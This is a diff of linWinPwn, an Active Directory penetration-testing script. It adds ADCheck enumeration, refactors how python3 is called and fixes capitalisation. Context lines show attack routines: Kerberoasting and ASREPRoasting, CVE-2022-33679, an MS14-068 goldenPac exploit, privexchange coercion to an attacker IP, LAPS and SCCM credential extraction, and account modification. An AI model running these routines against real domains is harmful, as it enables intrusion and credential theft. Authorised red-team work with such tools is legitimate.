@@ -116,10 +116,12 @@ pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
 GPOwned="$scripts_dir/GPOwned.py"
 privexchange="$scripts_dir/privexchange.py"
 RunFinger="$scripts_dir/Responder/RunFinger.py"
+ADCheck="$scripts_dir/ADcheck/ADcheck.py"
 adPEAS=$(which adPEAS)
 breads=$(which breads-ad)
 nmap=$(which nmap)
 john=$(which john)
+python3=$(which python3)
 
 print_banner () {
     echo -e "
@@ -129,7 +131,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.11 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.12 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -406,6 +408,7 @@ authenticate (){
         argument_GPOwned="-d ${domain} -u ${user} -p ${password}"
         argument_privexchange="-d ${domain} -u ${user} -p ${password}"
         argument_adpeas="-d ${domain} -u ${user} -p ${password}"
+        argument_adcheck="-d ${domain} -u ${user} -p ${password}"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -468,6 +471,7 @@ authenticate (){
                 argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
                 argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
                 argument_privexchange="-d ${domain} -u ${user} --hashes ${hash}"
+                argument_adcheck="-d ${domain} -u ${user} -H ${hash}"
                 auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
@@ -554,7 +558,7 @@ authenticate (){
                 if [ ! -f "${impacket_smbpasswd}" ] ; then
                     echo -e "${RED}[-] smbpasswd.py not found! Please verify the installation of impacket${NC}"
                 elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                    echo -e "${PURPLE}[-] smbpasswd does not support kerberos authentication${NC}"
+                    echo -e "${PURPLE}[-] smbpasswd does not support Kerberos authentication${NC}"
                 else
                     pass_passchange=""
                     if [ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]; then
@@ -663,7 +667,7 @@ dns_enum () {
         dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
         if [ ! -f "${dns_records}" ]; then
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                echo -e "${PURPLE}[-] adidnsdump does not support kerberos authentication${NC}"
+                echo -e "${PURPLE}[-] adidnsdump does not support Kerberos authentication${NC}"
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                 run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip}" | tee ${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt
@@ -790,7 +794,7 @@ ldapdomaindump_enum () {
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
         else
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos authentication ${NC}"
+                echo -e "${PURPLE}[-] ldapdomaindump does not support Kerberos authentication ${NC}"
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
                 run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
@@ -810,7 +814,7 @@ enum4linux_enum () {
     else
         echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
         if [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] enum4linux does not support kerberos authentication using AES Key${NC}"
+            echo -e "${PURPLE}[-] enum4linux does not support Kerberos authentication using AES Key${NC}"
         else
             run_command "${enum4linux_py} -A ${argument_enum4linux} ${target} -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain}" > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
@@ -933,7 +937,7 @@ bloodyad_all_enum () {
         mkdir -p ${output_dir}/DomainRecon/bloodyAD
         echo -e "${BLUE}[*] bloodyad All Enumeration${NC}"
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"            
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"            
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             domain_DN=$(fqdn_to_ldap_dn ${dc_domain})
@@ -968,7 +972,7 @@ bloodyad_write_enum () {
     else
         mkdir -p ${output_dir}/DomainRecon/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"            
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"            
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
@@ -984,7 +988,7 @@ bloodyad_dnsquery () {
     else
         mkdir -p ${output_dir}/DomainRecon/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"            
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"            
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
@@ -1006,7 +1010,7 @@ silenthound_enum () {
             echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
         else
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] SilentHound does not support kerberos authentication${NC}"
+                echo -e "${PURPLE}[-] SilentHound does not support Kerberos authentication${NC}"
             else
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/SilentHound
@@ -1037,7 +1041,7 @@ ldeep_enum () {
             echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
         else
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] ldeep does not support kerberos authentication${NC}"
+                echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication${NC}"
             else
                 if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
                 run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
@@ -1058,7 +1062,7 @@ windapsearch_enum () {
         mkdir -p ${output_dir}/DomainRecon/windapsearch
         echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] windapsearch does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
             run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" > ${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt
@@ -1119,15 +1123,15 @@ sccm_enum (){
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
-            run_command "$(which python3) ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-            run_command "$(which python3) ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
             if [[ ! $(grep 'SCCM doesn' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]] && [[ ! $(grep 'Traceback' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]]; then
-                run_command "$(which python3) ${sccmhunter} show -users" 2>/dev/null | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python3) ${sccmhunter} show -computers" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python3) ${sccmhunter} show -groups" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python3) ${sccmhunter} show -smb" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "${python3} ${sccmhunter} show -groups" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "${python3} ${sccmhunter} show -smb" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
                 echo -e "${GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:${NC}"
-                echo -e "$(which python3) ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
+                echo -e "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
             fi
         fi
     fi
@@ -1139,43 +1143,43 @@ ldapper_enum (){
         echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
     else
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] ldapper requires credentials and does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
         else
             mkdir -p ${output_dir}/DomainRecon/LDAPPER
             echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
             /usr/bin/jq -r ".[].samaccountname" ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all printers${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all computers${NC}" 
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
             /usr/bin/jq -r ".[].dnshostname" ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get Domain Trusts${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "orclCommonAttribute" SSO password hash${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "userPassword" SSO password hash${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get SCCM Servers${NC}"
-            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
         fi
     fi
     echo -e ""
@@ -1191,7 +1195,7 @@ adalanche_enum () {
             echo -e "${YELLOW}[i] Adalanche results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] Adalanche requires credentials and does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] Adalanche requires credentials and does not support Kerberos authentication${NC}"
             else
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/Adalanche
@@ -1210,7 +1214,7 @@ GPOwned_enum () {
     else
         echo -e "${BLUE}[*] GPO Enumeration using GPOwned${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] GPOwned requires credentials and does not support kerberos authentication${NC}"
+        echo -e "${PURPLE}[-] GPOwned requires credentials and does not support Kerberos authentication${NC}"
         else
             run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee ${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt
             run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a ${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt
@@ -1260,7 +1264,7 @@ aced_console (){
         else
             echo -e "${BLUE}[*] Launching aced${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "$(which python3) ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
+            run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1301,7 +1305,7 @@ ldapper_console (){
         echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
     else
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] ldapper requires credentials and does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
         else
             mkdir -p ${output_dir}/DomainRecon/LDAPPER
             echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
@@ -1317,11 +1321,35 @@ ldapper_console (){
 
             read -p "> " custom_option </dev/tty
             if [[ ! ${custom_option} == "back" ]]; then
-                run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
+                run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
             else
                 ad_menu
             fi
             ldapper_console
+        fi
+    fi
+    echo -e ""
+}
+
+adcheck_enum () {
+    if [ ! -f "${ADCheck}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of ADCheck${NC}"
+    else
+        mkdir -p ${output_dir}/DomainRecon/ADCheck
+        echo -e "${BLUE}[*] ADCheck Enumeration${NC}"
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] ADCheck requires credentials and does not support Kerberos authentication${NC}"
+        else
+            current_dir=$(pwd)
+            cd ${output_dir}/DomainRecon/ADCheck
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            run_command "${python3} ${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip} -bhf" | tee ${output_dir}/DomainRecon/ADCheck/ADCheck_output_${dc_domain}.txt
+            cd ${current_dir}
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" ${output_dir}/DomainRecon/ADCheck/*_users.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_adcheck_${dc_domain}.txt
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" ${output_dir}/DomainRecon/ADCheck/*_computers.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_adcheck_${dc_domain}.txt
+            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' ${output_dir}/DomainRecon/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > ${output_dir}/DomainRecon/Servers/sql_list_adcheck_${dc_domain}.txt
+            parse_users
+            parse_servers
         fi
     fi
     echo -e ""
@@ -1799,7 +1827,7 @@ asreprc4_attack () {
             if [ ! "${asrep_user}" == "" ]; then
                 current_dir=$(pwd)
                 cd ${output_dir}/Credentials
-                run_command "$(which python3) ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
+                run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
                 cd ${current_dir}
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
@@ -1902,7 +1930,7 @@ ms14-068_check () {
         echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
     else
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
         else
             run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
             if [[ $(grep "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>/dev/null) ]]; then
@@ -1973,7 +2001,7 @@ smb_map () {
         mkdir -p ${output_dir}/Shares/smbmapDump
         echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] smbmap does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] smbmap does not support Kerberos authentication${NC}"
         else
             smb_scan
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
@@ -2065,7 +2093,7 @@ finduncshar_scan () {
 manspider_scan () {
     echo -e "${BLUE}[*] Spidering Shares using manspider ${NC}"
     if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] manspider does not support kerberos authentication${NC}"
+        echo -e "${PURPLE}[-] manspider does not support Kerberos authentication${NC}"
     else
         mkdir -p ${output_dir}/Shares/manspiderDump
         echo -e "${CYAN}[*] Running manspider....${NC}"
@@ -2235,7 +2263,7 @@ rpcdump_check () {
     if [ ! -f "${impacket_rpcdump}" ] ; then
         echo -e "${RED}[-] rpcdump.py not found! Please verify the installation of impacket${NC}"
     elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-        echo -e "${PURPLE}[-] rpcdump does not support kerberos authentication${NC}"
+        echo -e "${PURPLE}[-] rpcdump does not support Kerberos authentication${NC}"
     else
         mkdir -p ${output_dir}/Vulnerabilities/RPCDump
         echo -e "${BLUE}[*] Impacket rpcdump${NC}"
@@ -2260,7 +2288,7 @@ coercer_check () {
     if [ ! -f "${coercer}" ] ; then
         echo -e "${RED}[-] Coercer not found! Please verify the installation of Coercer${NC}"
     elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Coercer does not support kerberos authentication${NC}"
+        echo -e "${PURPLE}[-] Coercer does not support Kerberos authentication${NC}"
     else
         mkdir -p ${output_dir}/Vulnerabilities/Coercer
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
@@ -2283,7 +2311,7 @@ privexchange_check () {
         echo -e "${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}"
     else
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] privexchange does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] privexchange does not support Kerberos authentication${NC}"
         else
             echo -e "${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}"
             if [ "${nullsess_bool}" == true ] ; then
@@ -2302,7 +2330,7 @@ privexchange_check () {
                 read -p ">> " target_exchange </dev/tty
             done
             set_attackerIP
-            run_command "$(which python3) ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee ${output_dir}/Vulnerabilities/privexchange_${dc_domain}.txt
+            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee ${output_dir}/Vulnerabilities/privexchange_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -2381,7 +2409,7 @@ change_pass () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"           
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}"
@@ -2411,7 +2439,7 @@ add_group_member () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"           
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Adding user to group. Please specify target group:${NC}"
@@ -2438,7 +2466,7 @@ add_computer () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
